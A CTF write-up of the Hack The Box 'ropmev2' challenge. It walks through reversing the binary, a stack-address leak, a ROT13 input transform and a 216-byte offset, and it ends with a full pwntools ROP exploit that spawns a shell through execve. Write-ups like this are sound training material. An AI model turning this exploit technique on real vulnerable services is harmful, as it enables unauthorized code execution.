---
layout: single
classes: wide
title: "HTB ropmev2 Writeup"
header:
  teaser: /assets/images/content/htb/ropmev2/teaser.png
excerpt: "ropmev2 was a fun binary exploitation challenge by [r4j](https://twitter.com/r4j0x00) in which we needed to rop our way through some twists to be able to build a successful exploit."
---

ropmev2 was a fun binary exploitation challenge by [r4j](https://twitter.com/r4j0x00) in which we needed to rop our way through some twists to be able to build a successful exploit.

We start by looking at the surface aspects of the binary. It is a 64-bit binary and `checksec` only reveals the NX protection. 

We use r2 to reverse it and figure out the execution flow. Basically everything is handled in the main function, so there's not much to say here.

![](/assets/images/content/htb/ropmev2/r2.png)

We ses printf prints the "welcoming" string: `"Please dont hack me"`, then there's a call to `read` that reads 500 bytes from stdin. Right after that there's an interesting call to `strcmp` that compares the entered string with `"DEBUG"` and then, if it is equal, printf gives us what at first glance seems to be a pointer loaded from a local variable. We can check out what it actually is by running the binary, inputting `"DEBUG"` and then analyzing with gdb.

We can break right after the call to `printf`: at `0x004011ee`. We can see that the binary outputted a value that seems to be the beginning of our stack. 

![](/assets/images/content/htb/ropmev2/gdb.png)

This leaked value could potentially be useful if we want to skip writing a `"/bin/sh"` to memory because instead we can simply use a stack address.

We run the binary for a quick test to see if what we input can modify the execution flow at all and we immediately notice something weird. If we input say `"A"*512` we cause a segmentation fault, but every overflowed register points to a string of all `"N"s`. These are not the `"A"s` we entered! There is clearly something happening in the background here.
At the end of `main` there was a call to an unusual function: `sub.strlen_238`. Taking a quick look at it, it seems this is the function causing this weird behavior. It can be hard to understand what this function does only reading asm code, so we'll open it in Ghidra to hopefully get some useful pseudocode :)

Once in Ghidra, we find the function and take a look at its decompilation:

![](/assets/images/content/htb/ropmev2/ghidra.png)

It seems all the function does is it subtracts `0xd` to every entered character `a-z;A-Z`. Hmmm... `0xd=13`, this function applies ROT13 to our input!

That figured out, using cyclic we can easily find the offset at which our input starts modifying the execution flow. We have to remember to ROT13 it before we check for an offset. We originally got `"rnnpsnnp"` overflowing into `RSP`, so after aplying the conversion we can check for an offset with `cyclic -l eaacfaac`:

![](/assets/images/content/htb/ropmev2/cyclic.png)

We have our offset at `216`. From here we can begin focusing into building our rop chain.

Looking at the binary more closely, we can find all the gadgets we nith + a syscall! This means the challenge is practically solved. We will load `59` into `RAX` for an execve syscall, load `"/bin/sh"` into `RDI` as our argument, and then zero out `RSI` and `RDX` to avoid any potential problems. For our pointer to the `"/bin/sh"` string, we can simply calculate the difference between the leaked value by our `"DEBUG"` input to the address were our second input gets stored. From there we can simply begin our payload with `"/bin/sh"`, put a bunch of junk in front of it to fill the offset until we overwrite `RSP`, and begin our rop chain. 

The final exploit looks like this (remember ROT13, we have to convert our `"/bin/sh"` to `"/ova/fu"` so that it gets converted back to `"/bin/sh"` by the binary):

```python
#!/usr/bin/python
from pwn import *

p = process("./ropmev2")

junk = "/ova/fu\x00".ljust(216, "A")

# Addresses
syscall = p64(0x0000000000401168)
pop_rax = p64(0x0000000000401162)
pop_rdi = p64(0x000000000040142b)
pop_rsi_r15 = p64(0x0000000000401429)
pop_rdx_r13 = p64(0x0000000000401164)

p.recvuntil("me")
p.sendline("DEBUG")
p.recvline()
leak = str(p.recvline())[-15:]
log.info("Leaked address: " + leak)

binsh = int(leak, 16) - 0xe0

payload = (junk
        + pop_rdi
        + p64(binsh)
        + pop_rax
        + p64(0x3b)
        + pop_rsi_r15
        + p64(0x00)*2
        + pop_rdx_r13
        + p64(0x00)*2
        + syscall)

p.recvuntil("me")
p.sendline(payload)

p.interactive()
```

And it gives us a local shell!

Now, the remote instance of the binary running in HTB servers had another twist: *there was no /bin/sh on the server*. When I was first doing the challenge I did struggle a lot with this, but it truly has a simple solution to it: all we need to do is change our `"/bin/sh"` (`"/ova/fu"`) to `"/bin/bash"` (`"/ova/onfu"`). That will give us a remote shell get us the flag for the challenge.

Hopefully this writeup was enjoyable and simple to understand, if you have any questions don't hesitate to contact me (c4e) on any of my socials or leave a comment below.
